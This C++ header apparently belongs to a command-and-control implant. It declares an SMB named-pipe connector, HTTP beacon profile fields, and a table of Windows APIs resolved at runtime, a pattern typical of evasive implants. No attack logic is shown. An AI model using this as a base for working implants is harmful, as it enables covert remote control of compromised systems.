#pragma once

#include <windows.h>
#include <aclapi.h>
#include "ntdll.h"

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT
typedef struct {
	WORD   port;
	ULONG  servers_count;
	BYTE** servers;
	BOOL   use_ssl;
	BYTE*  http_method;
	BYTE*  uri;
	BYTE*  parameter;
	BYTE*  user_agent;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;
#endif

#define DECL_API(x) decltype(x) * x

struct SMBFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);
	DECL_API(ReadFile);
	DECL_API(WriteFile);

	DECL_API(NtClose);

	//kernel32
	DECL_API(ConnectNamedPipe);
	DECL_API(DisconnectNamedPipe);
	DECL_API(CreateNamedPipeA);
	DECL_API(FlushFileBuffers);
	DECL_API(PeekNamedPipe);

	//advapi32
	DECL_API(AllocateAndInitializeSid);
	DECL_API(InitializeSecurityDescriptor);
	DECL_API(FreeSid);
	DECL_API(SetEntriesInAclA);
	DECL_API(SetSecurityDescriptorDacl);
};

class ConnectorSMB
{
	CHAR* pipename = NULL;

	BYTE* recvData   = NULL;
	DWORD recvSize   = 0;
	ULONG allocaSize = 0;

	SMBFUNC* functions = NULL;

	HANDLE hChannel = NULL;

public:
	ConnectorSMB();

	BOOL SetConfig(ProfileSMB profile, BYTE* beat, ULONG beatSize);

	void Listen();
	void Disconnect();
	void CloseConnector();

	void  SendData(BYTE* data, ULONG data_size);
	BYTE* RecvData();
	DWORD RecvSize();
	void  RecvClear();
};